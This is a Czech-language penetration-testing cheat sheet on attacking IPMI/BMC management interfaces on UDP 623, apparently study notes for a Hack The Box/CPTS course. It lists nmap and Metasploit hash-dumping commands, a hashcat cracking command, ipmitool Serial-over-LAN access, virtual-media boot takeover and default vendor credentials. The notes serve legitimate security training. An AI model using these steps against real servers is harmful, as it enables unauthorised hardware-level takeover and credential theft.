# IPMI (Intelligent Platform Management Interface) – Port 623 UDP

IPMI je **out-of-band management protokol** pro správu serverů.

Běží na:

- **BMC (Baseboard Management Controller)**
- vlastní síťové kartě/IP adrese
- funguje i při vypnutém serveru

Komunikace:

```
Admin
 |
 | UDP 623
 ↓
BMC/IPMI
 |
 ↓
Server Hardware
```

---

# Enumerace

Cíl:

- zjistit IPMI verzi
- najít uživatele
- získat hash hesla

---

# Nmap Scan

```
sudo nmap -sU -p623 \
--script ipmi-version,ipmi-dumphashes \
TARGET
```

Hledat:

```
IPMI-2.0
```

→ možné RAKP hash dumpování

---

# RAKP Hash Attack

IPMI 2.0 má problém v autentizaci:

```
Client
 |
 | Request login
 ↓
BMC
 |
 | Response + hash
 ↓
Attacker
```

Útočník získá hash a crackuje ho offline.

---

# Metasploit

```
use auxiliary/scanner/ipmi/ipmi_dumphashes

set RHOSTS TARGET

run
```

---

# Crackování Hashu

Hashcat:

```
hashcat -m 7300 ipmi.hash rockyou.txt
```

---

# Připojení přes ipmitool

Po získání hesla:

---

## Výpis uživatelů

```
ipmitool \
-I lanplus \
-H TARGET \
-U user \
-P password \
user list
```

---

## Informace o serveru

```
ipmitool \
-I lanplus \
-H TARGET \
-U user \
-P password \
fru list
```

Může obsahovat:

- název serveru
- inventární informace
- poznámky administrátora

---

## Serial Over LAN (SoL)

```
ipmitool \
-I lanplus \
-H TARGET \
-U user \
-P password \
sol activate
```

Poskytuje:

- vzdálenou konzoli
- přístup jako u fyzického monitoru

---

# Post-Exploitation

---

# 1. Serial Over LAN (SoL)

Možnosti:

- přístup k boot procesu
- BIOS/GRUB manipulace
- obnova hesel
- přímá práce s OS

---

# 2. Virtual Media

Pokud existuje webové rozhraní:

- iDRAC
- iLO
- BMC Web UI

lze:

```
Mount ISO
    ↓
Restart serveru
    ↓
Boot z ISO
    ↓
Přístup k diskům
```

---

# 3. SNMP z BMC

BMC často používá také SNMP.

Kontrolovat:

- community string
- další síťové informace
- monitoring účty

---

# Default Credentials

Často zkoušet:

```
admin:admin
root:calvin
Administrator:password
```

---

# IPMI Pentest Checklist

☐ UDP 623 otevřený  
☐ IPMI verze  
☐ IPMI 2.0 RAKP hash  
☐ Default credentials  
☐ Dump uživatelů  
☐ Crack hashů  
☐ Web management panel  
☐ SoL přístup  
☐ Virtual Media  
☐ SNMP konfigurace

---

# HTB / CPTS IPMI Workflow

```
UDP Scan
 ↓
Port 623
 ↓
Identify IPMI Version
 ↓
Dump RAKP Hash
 ↓
Crack Password
 ↓
Login ipmitool/Web UI
 ↓
SoL / Virtual Media
 ↓
OS Access
```

---

# Nejčastější IPMI nálezy

|Finding|Dopad|
|---|---|
|IPMI 2.0 RAKP|Offline crack hesla|
|Default credentials|Kompletní HW kontrola|
|Exposed BMC|Převzetí serveru|
|SoL access|Přímý OS přístup|
|Virtual Media|Boot vlastního systému|